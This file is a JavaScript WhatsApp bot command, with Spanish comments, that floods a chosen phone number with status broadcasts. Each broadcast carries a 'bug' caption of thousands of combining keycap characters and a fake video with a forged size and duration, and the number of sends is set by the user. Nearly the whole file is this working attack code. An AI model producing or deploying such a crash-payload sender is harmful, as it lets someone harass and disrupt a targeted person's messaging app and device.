let handler = async (m, { conn, text }) => {
  if (!text) throw 'Ejemplo:\n.estado +521234567890/10'

  let [num, count] = text.split('/')
  if (!num || !count) throw 'Formato incorrecto'

  let numero = num.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  let cantidad = parseInt(count)

  if (isNaN(cantidad) || cantidad < 1) throw 'Cantidad inválida'

  // 🔥 AQUÍ controlas el "peso" del texto
  function generarBug() {
    let base = 'o\u20E3' // carácter tipo tu imagen

    let REPETICION_HORIZONTAL = 300 // 👈 CUÁNTOS caracteres por línea
    let REPETICION_VERTICAL = 11     // 👈 CUÁNTAS líneas

    let linea = base.repeat(REPETICION_HORIZONTAL)

    return (linea + '\n').repeat(REPETICION_VERTICAL)
  }

  for (let i = 0; i < cantidad; i++) {

    await conn.sendMessage('status@broadcast', {
      video: { url: 'https://example.com/video.mp4' }, // 📹 video que no existe
      caption: generarBug(),
      mimetype: 'video/mp4',
      fileLength: 999999999, // fake tamaño
      seconds: 999999, // fake duración
      contextInfo: {
        mentionedJid: [numero],
        isForwarded: true,
        forwardingScore: 999
      }
    })

    await new Promise(r => setTimeout(r, 2000))
  }

  m.reply(`✅ ${cantidad} estados enviados`)
}

handler.command = ['estado']
export default handler
